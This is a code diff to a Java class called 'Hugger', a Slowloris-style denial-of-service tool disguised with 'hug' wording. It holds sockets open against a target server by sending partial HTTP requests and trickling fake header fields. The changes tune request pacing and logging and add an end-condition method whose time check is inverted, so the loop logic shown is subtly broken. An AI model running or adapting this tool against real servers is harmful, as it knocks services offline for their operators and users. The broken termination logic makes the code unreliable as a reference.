@@ -15,7 +15,7 @@ public class Hugger implements Runnable {
 
     private static final Logger log = LogManager.getLogger(Hugger.class);
 
-    private static final int PAUSE_BETWEEN_REQUESTS = 1000;
+    private static final int PAUSE_BETWEEN_REQUESTS = 2000;
 
     private URL hugReceiver;
     private int port;
@@ -49,9 +49,9 @@ public class Hugger implements Runnable {
         }
 
         int wave = 0;
-        while (!stop && (System.currentTimeMillis() - startTime) < (hugTime * 60 * 1000)) {
+        while (!endCondition(startTime)) {
             hug();
-            log.info("{} waves of hugs for {}", wave++, hugReceiver);
+            log.info("{} wave of hugs for {}", wave++, hugReceiver);
         }
 
         log.info("{} had enough hugs. Ending", hugReceiver);
@@ -60,7 +60,6 @@ public class Hugger implements Runnable {
         } catch (IOException e){
             log.error("{}: Couldn't close connections", hugReceiver);
         }
-
     }
 
     public void stop() {
@@ -68,6 +67,10 @@ public class Hugger implements Runnable {
         stop = true;
     }
 
+    private boolean endCondition(long startTime) {
+        boolean timeout = hugTime > 0 ? (System.currentTimeMillis() - startTime) < (hugTime * 60 * 1000) : false;
+        return stop || timeout;
+    }
 
     /**
      * creates the initial partial requests that are sent to the server
@@ -124,7 +127,7 @@ public class Hugger implements Runnable {
                 if (sockets[i] != null) sockets[i].getOutputStream().write(System.lineSeparator().getBytes());
             } catch (IOException e) {
                 log.warn("Couldn't gracefully close connections");
-                log.debug(e);
+                log.debug("Reason:", e);
             } finally {
                 if (sockets[i] != null) sockets[i].close();
             }
@@ -137,7 +140,7 @@ public class Hugger implements Runnable {
     private void hug() {
         for (int i = 0; i < connections && !stop; i++) {
             sendFalseHeaderField(i);
-            sleep(100, max(100, PAUSE_BETWEEN_REQUESTS / connections));
+            sleep(100, max(200, PAUSE_BETWEEN_REQUESTS / connections));
         }
         sleep(100, PAUSE_BETWEEN_REQUESTS); // wait a random time before sending
     }
@@ -153,7 +156,8 @@ public class Hugger implements Runnable {
         try {
             if (sockets[index] != null) sockets[index].getOutputStream().write(fakeField.getBytes());
         } catch (IOException e) {
-            log.error("Failed to send header. Reconnecting...", e);
+            log.error("Failed to send header to {}. Reconnecting...", hugReceiver);
+            log.debug("Reason:", e);
             initConnection(index); // try to re-connect
         }
     }
@@ -167,11 +171,12 @@ public class Hugger implements Runnable {
         try {
             // write a random partial HTTP GET request to the server
             if (sockets[index] != null) {
-                log.info("Sending partial request: {}", index);
+                log.info("Sending partial request to: {} [{}]", hugReceiver, index);
                 sockets[index].getOutputStream().write(partialRequests[RND.nextInt(connections)].getBytes());
             }
         } catch (IOException e) {
-            log.error("Failed to send partial request. Reconnecting...", e);
+            log.error("Failed to send partial request to {}. Reconnecting...", hugReceiver);
+            log.debug("Exception:", e);
             initConnection(index); // try to reestablish connection
         }
     }
